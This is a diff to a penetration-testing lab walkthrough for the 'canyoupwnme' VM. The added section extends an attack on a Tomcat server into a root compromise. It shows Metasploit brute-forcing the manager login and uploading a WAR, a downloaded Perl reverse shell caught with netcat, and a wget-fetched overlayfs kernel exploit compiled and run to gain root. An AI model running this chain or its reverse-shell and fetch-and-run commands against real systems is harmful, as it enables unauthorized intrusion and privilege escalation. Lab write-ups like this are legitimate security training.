@@ -44,9 +44,9 @@ needed. Metsasploit can help us...
     msf auxiliary(tomcat_mgr_login) > quit
 
 Yep! Credentials `tomcat:tomcat` were found. Still using Metasploit, we can
-upload a crafted `.WAR` in order to have a reverse TCP shell enabled.
+upload a crafted `.WAR` in order to have a meterpreter session.
 
-## Injecting a reverse shell
+## Startin a meterpreter session
 
     msf > use exploit/multi/http/tomcat_mgr_upload
     msf exploit(tomcat_mgr_upload) > set username tomcat
@@ -69,8 +69,73 @@ upload a crafted `.WAR` in order to have a reverse TCP shell enabled.
     id
     uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
 
-Got it!
-
 ## Becoming `root`
 
-Work in progress...
+On the attacker machine, download and configure a Perl reverse shell
+
+    $ wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz
+    $ tar zxvf perl-reverse-shell-1.0.tar.gz
+    $ cd perl-reverse-shell-1.0
+    $ vim perl-reverse-shell.pl # set IP and PORT at lines 45 and 46
+
+Once prepared, upload the reverse shell on the target machine using the
+meterpreter
+
+    meterpreter > upload perl-reverse-shell.pl /tmp/perl-reverse-shell.pl
+    [*] uploading  : perl-reverse-shell.pl -> /tmp/perl-reverse-shell.pl
+    [*] uploaded   : perl-reverse-shell.pl -> /tmp/perl-reverse-shell.pl
+
+On the attacker machine, start listening
+
+    $ nc -nvp 9876
+    listening on [any] 9876 ...
+
+while on the victim machine, execute the Perl script
+
+    meterpreter > shell
+    Process 2 created.
+    Channel 3 created.
+    perl /tmp/perl-reverse-shell.pl
+    Content-Length: 0
+    Connection: close
+    Content-Type: text/html
+
+    Content-Length: 43
+    Connection: close
+    Content-Type: text/html
+
+    Sent reverse shell to 10.0.100.245:9876<p>
+
+On the attacker machine you should see something like that
+
+    connect to [10.0.100.245] from canyoupwnme.pentest [10.0.100.195] 53929
+     12:24:48 up 55 min,  0 users,  load average: 0.00, 0.01, 0.04
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+    uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
+    /
+    /usr/sbin/apache: 0: can't access tty; job control turned off
+    $
+
+Spawn a `tty` shell
+
+    $ python -c "import pty; pty.spawn('/bin/bash');"
+    tomcat7@canyoupwnme:/$  whoami
+    whoami
+    tomcat7
+    tomcat7@canyoupwnme:/$ id
+    id
+    uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
+
+and try with the `overlayfs` local root exploit used with
+[Redis](000-redis.md)
+
+    $ mkdir tmp
+    $ cd tmp
+    $ wget https://www.exploit-db.com/download/39166 -O ofs.c
+    $ gcc ofs.c -o ofs.bin
+    $ ./ofs.bin
+    # id
+    # uid=0(root) gid=1000(user) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),115(lpadmin),1000(user)
+
+Got it!
